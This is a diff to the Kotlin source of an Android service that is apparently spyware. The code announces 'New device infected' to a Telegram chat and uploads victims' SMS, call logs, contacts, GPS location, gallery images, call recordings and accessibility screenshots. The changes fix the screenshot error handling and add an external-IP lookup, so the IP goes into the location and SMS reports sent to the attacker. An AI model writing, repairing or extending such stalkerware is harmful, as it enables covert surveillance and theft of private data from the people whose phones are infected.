@@ -1,42 +1,31 @@
 package com.luffa
 
+import android.accessibilityservice.AccessibilityService
 import android.app.*
 import android.content.*
-import android.graphics.*
+import android.graphics.Bitmap
 import android.hardware.camera2.*
 import android.location.LocationManager
 import android.media.*
-import android.net.Uri
 import android.os.*
 import android.provider.*
 import android.telephony.PhoneStateListener
 import android.telephony.TelephonyManager
 import android.util.Log
 import android.view.Display
-import android.view.WindowManager
 import androidx.core.app.NotificationCompat
 import androidx.work.*
 import kotlinx.coroutines.*
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.asRequestBody
-import org.json.JSONArray
 import org.json.JSONObject
 import java.io.*
 import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.TimeUnit
-
-
-import okhttp3.OkHttpClient
-import okhttp3.Request
-
 import kotlin.coroutines.resume
-import android.accessibilityservice.AccessibilityService
-import android.graphics.Bitmap
-import kotlinx.coroutines.suspendCancellableCoroutine
-
 
 class MyService : Service() {
 
@@ -45,7 +34,6 @@ class MyService : Service() {
         const val CHAT_ID = "8820979221"
         private val client = OkHttpClient()
 
-        // Static method for NotifListener to call
         suspend fun sendStaticTelegramMessage(text: String) {
             try {
                 val form = FormBody.Builder()
@@ -93,7 +81,6 @@ class MyService : Service() {
         telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
         telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
 
-        // First infection message
         CoroutineScope(Dispatchers.IO).launch {
             sendTelegramMessage("✅ New device infected: ${Build.MODEL} (${Build.VERSION.RELEASE})")
         }
@@ -221,17 +208,14 @@ class MyService : Service() {
                         }
                     }
 
-
-override fun onFailure(errorCode: Int) {
-    val errMsg = when (errorCode) {
-        AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR -> "Screenshot failed (overlay/locked)"
-        AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME -> "Too many attempts"
-        else -> "Unknown error code $errorCode"
-    }
-    ...
-}
-
-                    
+                    override fun onFailure(errorCode: Int) {
+                        val errMsg = when (errorCode) {
+                            AccessibilityService.TakeScreenshotCallback.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR ->
+                                "Screenshot failed (overlay/locked)"
+                            AccessibilityService.TakeScreenshotCallback.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME ->
+                                "Too many attempts"
+                            else -> "Unknown error code $errorCode"
+                        }
                         Log.e("Screenshot", errMsg)
                         if (cont.isActive) cont.resume(null)
                     }
@@ -365,7 +349,7 @@ override fun onFailure(errorCode: Int) {
         } ?: sendTelegramMessage("No contacts permission.")
     }
 
-    // ================== CALL LOG (FIXED – unified token) ==================
+    // ================== CALL LOG ==================
     private suspend fun uploadCallLog(limit: Int) {
         val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT $limit")
         cursor?.use {
@@ -453,6 +437,15 @@ override fun onFailure(errorCode: Int) {
         )
     }
 
+    // Helper: external IP
+    private fun getExternalIP(): String {
+        return try {
+            val url = URL("http://ip-api.com/json/?fields=query")
+            val json = url.readText()
+            JSONObject(json).getString("query")
+        } catch (e: Exception) { "Unavailable" }
+    }
+
     // ================== WORKER CLASSES ==================
     class AutoLocationWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
         override fun doWork(): Result {
@@ -460,15 +453,12 @@ override fun onFailure(errorCode: Int) {
                 try {
                     val lm = applicationContext.getSystemService(LOCATION_SERVICE) as LocationManager
                     val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-
-
-val msg = if (loc != null) {
-    "📍 Auto Location:\nLat: ${loc.latitude}, Lng: ${loc.longitude}"
-} else {
-    "📍 Auto Location (no GPS):\nLat: unavailable"
-}
-
-                   
+                    val ip = getExternalIP()
+                    val msg = if (loc != null) {
+                        "📍 Auto Location\nIP: $ip\nLat: ${loc.latitude}, Lng: ${loc.longitude}"
+                    } else {
+                        "📍 Auto Location (no GPS)\nIP: $ip\nLat: unavailable"
+                    }
                     MyService.sendStaticTelegramMessage(msg)
                 } catch (e: Exception) { /* ignore */ }
             }
@@ -481,7 +471,7 @@ val msg = if (loc != null) {
             CoroutineScope(Dispatchers.IO).launch {
                 try {
                     val cursor = applicationContext.contentResolver.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC LIMIT 5")
-                   
+                    val ip = getExternalIP()
                     val sb = StringBuilder("🔔 Auto SMS report (last 5)\nIP: $ip\n")
                     cursor?.use {
                         val colAddr = it.getColumnIndex("address")
@@ -495,10 +485,15 @@ val msg = if (loc != null) {
             }
             return Result.success()
         }
-    }
 
-    // Helper: external IP
-    
+        private fun getExternalIP(): String {
+            return try {
+                val url = URL("http://ip-api.com/json/?fields=query")
+                val json = url.readText()
+                JSONObject(json).getString("query")
+            } catch (e: Exception) { "Unavailable" }
+        }
+    }
 
     // ================== CALL RECORDING ==================
     private fun startCallRecording() {
@@ -546,7 +541,6 @@ val msg = if (loc != null) {
 
     private fun getAllGalleryImages(): List<String> {
         val list = mutableListOf<String>()
-        // Try both MediaStore query methods
         val projection = arrayOf(MediaStore.Images.Media.DATA)
         try {
             contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC")?.use { cursor ->
